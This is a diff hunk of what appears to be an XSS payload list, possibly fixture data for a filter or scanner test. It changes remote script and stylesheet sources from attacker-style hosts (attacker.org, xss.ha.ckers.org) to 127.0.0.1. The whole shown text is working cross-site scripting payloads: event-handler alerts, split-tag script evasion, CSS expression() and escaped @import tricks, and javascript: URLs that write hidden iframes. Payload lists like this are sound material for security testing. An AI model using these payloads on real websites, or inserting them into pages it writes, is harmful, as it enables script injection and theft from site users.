@@ -30,12 +30,12 @@ Onmousemove%3d"alert('xss')
 <input type%3d"hidden" accesskey%3d"X" onclick%3d"alert(/xss/)">
 <span  onclick%3d'alert(/xss/)' >span</span>
 <scr<script>ipt>alert("XSS")</scr<script>ipt>
-<LAYER src="http://xss.ha.ckers.org/a.js"></layer>
+<LAYER src="http://127.0.0.1/a.js"></layer>
 <div onclick="alert('xss')">
 <div style="color: expression(alert('XSS'))">
-<style>@import url("http://attacker.org/malicious.css");</style>
+<style>@import url("http://127.0.0.1/xss.css");</style>
 <style>malicious.css:body {    color:expression(alert('XSS'));}</style>
-<style>@imp\ort url("http://attacker.org/malicious.css");</style>
+<style>@imp\ort url("http://127.0.0.1/xss.css");</style>
 <style>body { background-image: url('javascript:open("http://127.0.0.1/css.htm")') }</style>
 <style>body { background-image: url('javascript:document.write("<Iframe src=http://127.0.0.1/css.htm width=0 height=0></iframe>")') } </style>
 <a href="javascript:al\u0065rt(1)">ok</a>
